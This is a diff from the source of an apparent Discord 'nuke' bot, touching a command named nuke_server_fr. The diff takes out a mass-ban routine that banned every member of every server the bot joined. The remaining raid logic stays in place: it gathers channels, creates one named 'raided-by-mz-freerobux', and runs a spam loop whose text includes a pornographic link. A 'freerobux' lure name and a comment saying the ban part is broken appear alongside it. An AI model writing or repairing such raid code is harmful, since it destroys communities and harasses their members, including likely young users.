@@ -275,18 +275,6 @@ async def nuke_server_fr(ctx):
             else:
                 
                 try:
-                    all_members_list = []
-
-                    for guild in bot.guilds:
-                        for membertemp in guild.members:
-                            all_members_list.append(membertemp)
-
-                    async def ban(self, *, member1: discord.Member, reason=None):
-                        await member1.ban(reason=reason)
-
-                    for member in all_members_list:
-                        await ban(member1=member, self=None)
-                                
                     try:
                         text_channel_list = []
                         for guild1 in bot.guilds:
@@ -308,7 +296,7 @@ async def nuke_server_fr(ctx):
                     None
                 finally:
                     None
-        
+            
             guild = ctx.message.guild
             newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
             for i in range(64):
@@ -330,7 +318,7 @@ http://pornhub.com/**""")
                 except:
                     None
         
-
+   
 # ban part broken for now
 
 @bot.command(name='gg', help='GG, Stay!')
